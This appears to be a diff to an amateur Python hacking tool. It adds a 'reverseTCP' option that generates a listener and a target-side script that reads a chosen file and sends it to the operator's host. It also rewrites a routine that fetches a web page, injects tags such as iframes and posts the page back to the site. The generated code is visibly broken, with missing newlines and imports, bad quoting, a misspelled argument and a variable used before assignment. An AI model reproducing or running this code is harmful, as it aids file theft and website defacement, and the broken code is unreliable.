@@ -84,6 +84,68 @@ while True:
                     copied_fule_path = os.path.join(defaultpath + "\\" + filename)
                     continue
 
+                elif xb == "reverseTCP":
+
+                    print("basic yawwwwwwn butyea")
+                    print("Creating files..")
+                    
+                    jj78 = input("Enter local address: ")
+                    m89 = input("Enter local port: ")
+                    k34 = input("Enter data to send to target: ")
+                    o57 = input("Extension for data saved to target: ")
+                    riga70 = input("File to receive from target: ")
+
+                    with open("localTCP.py", "w") as f:
+                        w = f.write
+
+                        w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
+
+                        w(f"server_address = ({jj78}, {m89})")
+                        w("sock.bind(server_address)")
+
+                        w("sock.listen(1)")
+
+                        w("while True:")
+                        w("    connection, client_address = sock.accept()")
+                        w("    try:")
+                                
+                        w("        data = connection.recv(1024)")
+                        w(f"        message = {k34}")
+                        w("        connection.sendall(message.encode())")
+                        w("    except:")
+                        w("        print("@w@")")
+                        w("        continue")
+                        w("    finally:")
+                        w("        connection.close()")
+                        os.system("python localTCP.py")
+                    with open("uji67.py", "w") as f:
+                        w = f.write
+
+                        w(f"with open({riga70}, 'rb') as f:")
+                        w(f"    {riga70} = f.read()")
+
+                        w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
+
+                        w(f"server_address = ({jj78}, {m89})")
+                        w("sock.connect(server_address)")
+
+                        w("try:")
+                        w(f"    message = str(os.system) + {riga70}")
+                        w("    sock.sendall(message.encode())")
+
+                        w("    data = sock.recv(1024)")
+                        w("    print(f"'{data.decode()}'")")
+                        w(f"    with open('runky.' + {o57}, 'w') as f:")
+                        w("        f.write(data.decode())")
+                            
+
+                        w("finally:")
+                        w("    sock.close()")
+
+                        filename = "uji67.py"
+
+                        continue
+
                 # pwn nubz
                 for i in range(1, 256):
                     try:
@@ -373,13 +435,79 @@ while True:
                     ron60 = input("element to inject to: ")
                     lenny44 = input("new tag: ")
                     morgi11 = input("content to inject: ")
-                    rova = requests.get(rita90)
-                    sovi = BeautifulSoup(rova.content, 'html.parser')
-                    blik34 = sovi.find(ron60)
-                    x23 = sovi.new_tag(lenny44)
-                    x23.string = morgi11
-                    blik34.append(x23)
-                    jonah40 = requests.post(rita90, dta=str(sovi))
+                    test_cases = [
+                        {
+                            'website': rita90,
+                            'element': ron60,
+                            'tag': lenny44,
+                            'content': 'This is a new paragraph.',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'p',
+                            'tag': 'p',
+                            'content': 'This is a new paragraph.',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'title',
+                            'tag': 'title',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'body',
+                            'tag': 'title',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'body',
+                            'tag': 'div',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'body',
+                            'tag': 'iframe',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': ron60,
+                            'tag': 'title',
+                            'content': 'New Title',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'img',
+                            'tag': 'img',
+                            'content': '',
+                        },
+                    ]
+                    for test_case in test_cases:
+                        try:
+                            gh4 = test_case['website']
+                            b234 = test_case['element']
+                            m65 = test_case['tag']
+                            v32 = test_case['content']
+                            skivi = requests.get(gh4)
+                            rini = BeautifulSoup(skivi.content, 'html.parser')
+                            ravi13 = rini.find(b234)
+                            x07 = rini.new_tag(m65)
+                            x07.string = v32
+                            ravi13.append(x07)
+                            jonah40 = requests.post(rita90, dta=str(sovi))
+                            rova = requests.get(rita90)
+                            sovi = BeautifulSoup(rova.content, 'html.parser')
+                            blik34 = sovi.find(ron60)
+                            x23 = sovi.new_tag(lenny44)
+                            x23.string = morgi11
+                            blik34.append(x23)
+                            jonah40 = requests.post(rita90, dta=str(sovi))
+                        except:
+                            print("wango")
+                            break
                 
     elif x1 == "3":
         print("bowza")
